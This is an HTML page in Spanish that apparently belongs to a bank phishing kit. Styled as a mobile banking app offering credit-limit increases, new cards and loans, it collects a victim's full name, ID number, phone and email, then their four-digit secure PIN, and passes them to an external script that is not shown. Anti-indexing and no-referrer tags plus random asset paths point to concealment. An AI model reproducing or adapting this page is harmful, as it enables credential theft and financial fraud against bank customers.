<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>App</title>
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, none">
  <meta name="googlebot" content="noindex, nofollow">
  <meta name="bingbot" content="noindex, nofollow">
  <meta name="google" content="notranslate">
  <meta name="referrer" content="no-referrer">
  <link rel="sitemap" type="application/xml" href="/sitemap.xml">
  <style>
  body{margin:0;padding:0;background-color:#edf7ff;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',Roboto,Arial,sans-serif} .box-container{width:100%;max-width:414px;height:95vh;max-height:850px;background-color:#fff;border-radius:5px;box-shadow:0 20px 50px rgba(0,0,0,.1);overflow:hidden;position:relative;display:flex;flex-direction:column} .screen{display:none;height:100%;width:100%;flex-direction:column;overflow-y:auto} .screen.active{display:flex} .app-header{background-color:#0041c2;padding:15px 25px;display:flex;align-items:center;height:56px;flex-shrink:0} .back-arrow{color:#fff;font-size:24px;cursor:pointer;text-decoration:none} .container__login{padding:20px 25px;flex-grow:1} .btn-main{width:100%;background-color:#0041c2;color:#fff;border:none;padding:16px;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;margin-top:10px} .btn-main:disabled{background-color:#e0e0e0;color:#9e9e9e;cursor:not-allowed} #screen1{background-color:#0041c2;color:#fff} .main-image{width:100%;margin:5px 0;border-radius:15px} .identification-group{display:flex;margin-bottom:15px} .custom-select,.custom-input{padding:14px;border:1px solid #ced4da;font-size:15px} .custom-select{width:100px;border-radius:10px 0 0 10px;background:#fff} .select-full{width:100%;border-radius:10px;margin-bottom:15px; border-left: 1px solid #ced4da;} .custom-input{flex:1;border-radius:0 10px 10px 0;border-left:none} .input-full{width:100%;border-radius:10px;margin-bottom:15px;box-sizing:border-box;border-left:1px solid #ced4da} .input-group{position:relative} .toggle-pwd{position:absolute;right:15px;top:15px;color:#0041c2;font-weight:700;cursor:pointer;border:none;background:0 0} .label-text{font-size:13px; color:#555; font-weight:600; display:block; margin-bottom:5px;} /* Loader */ #loading-screen { justify-content: center; align-items: center; background: rgba(255,255,255,0.95); position: absolute; top: 0; left: 0; z-index: 1000; width:100%; height:100%; display:none; flex-direction:column; } #loading-screen.active { display:flex; } .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0041c2; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; } @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>

<body>
  <div class="box-container">
    <div id="loading-screen">
      <div class="spinner">
      </div>
      <p style="margin-top: 15px; color: #0041c2; font-weight: 600;">Validando información...</p>
    </div>
    <div id="screen2" class="screen active">
      <div class="app-header">
      </div>
      <div class="container__login">
        <img src="./cewrewer/734ghed734gb.webp" style="max-width:190px">
        <h2 style="color:#333; font-size:18px">Si eres clientes continua tu solicitud.</h2>
        <span class="label-text">¿Qué trámite deseas realizar?</span>
        <select id="tipoTransaccion" class="custom-select select-full" onchange="validateS2()">
          <option value="Aumento de Cupo">Aumento de Cupo</option>
          <option value="Nueva Tarjeta">Nueva Tarjeta</option>
          
          <option value="Credito Libranza">Crédito Libranza</option>
          <option value="Credito Libre inversion">Crédito Libre inversion</option>
        </select>
        <span class="label-text">Nombre completo</span>
        <input type="text" id="fullname" class="custom-input input-full" placeholder="Nombre Apellido" oninput="validateS2()">
        <span class="label-text">Documento de identidad</span>
        <div class="identification-group">
          <select id="IType" class="custom-select" onchange="validateS2()">
            <option value="CC">C.C.</option>
            <option value="CE">C.E.</option>
            <option value="TI">T.I.</option>
          </select>
          <input type="tel" id="numi" class="custom-input" placeholder="Documento" maxlength="15" oninput="validateS2()">
        </div>
        <span class="label-text">Número de teléfono</span>
        <input type="tel" id="phone" class="custom-input input-full" placeholder="Teléfono" maxlength="10" oninput="validateS2()">
        <span class="label-text">Correo electrónico</span>
        <input type="email" id="email" class="custom-input input-full" placeholder="correo@ejemplo.com" oninput="validateS2()">
        <label style="font-size:12px;color:#555;">
          <input type="checkbox" id="checkTerms" onchange="validateS2()">Acepta términos</label>
        <button id="btnNextS2" class="btn-main" disabled onclick="toScreen3()">Continuar</button>
      </div>
    </div>
    <div id="screen3" class="screen">
      <div class="app-header">
        <span class="back-arrow" onclick="showScreen('screen2')">←</span>
      </div>
      <div class="container__login">
        <img src="./cewrewer/734ghed734gb.webp" style="max-width:190px">
        <h2 style="color:#333">Confimanos que eres tu.</h2>
        <span class="label-text">Ingrese su clave segura</span>
        <div class="input-group">
          <input type="tel" id="clvseg" class="custom-input" style="border-radius:10px;width:100%;border-left:1px solid #ced4da" maxlength="4" placeholder="****" oninput="this.value = this.value.replace(/\D/g, '')">
          <button class="toggle-pwd" onclick="togglePass()">Mostrar</button>
        </div>
        <button class="btn-main" onclick="finalLogin()">Continuar</button>
      </div>
    </div>
  </div>
  <script src="./js/ex.js"></script>
</body>

</html>
